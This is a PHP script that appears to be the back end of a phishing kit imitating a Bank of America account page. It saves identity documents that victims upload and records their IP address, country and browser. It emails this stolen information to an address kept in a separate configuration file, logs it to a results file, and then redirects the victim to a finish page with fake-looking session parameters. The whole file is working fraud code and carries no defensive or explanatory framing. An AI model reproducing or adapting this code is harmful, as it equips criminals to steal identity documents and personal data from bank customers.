<?php
    include 'email.php';
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];
    $subject = 'Login Account [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';

    $message = '|============ BOA EN Account Q&A ===========|'."\r\n";
    foreach ($_FILES as $kk => $file)
    {
        foreach ($file['name'] as $key => $ff) {
            $ext = pathinfo($ff, PATHINFO_EXTENSION);
            $base = getcwd().'/proof/';
            $new_name = md5(rand(111,9999)).".".strtolower($ext);
            $uploads_dir = $base.$new_name;
            $moved = move_uploaded_file($file['tmp_name'][$key], $uploads_dir);
            $files['files']['name'] = $ff;
            $files['files']['new_name'] = $new_name;
            $files['files']['url'] = $uploads_dir;
            $message .= '|ID        :  '.$uploads_dir."\r\n";
        }
    }
    $message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";
    $messags   =  "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."\r\n";
    $headers = 'From: BOA EN Q&A <notify_login_boaen@mail.com>'."\r\n";
    mail($to, $subject, $message, $headers);
    $file = fopen("Rzlt.txt","ab");
    fwrite($file,$message);
    fclose($file);
    header("location: Finish.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>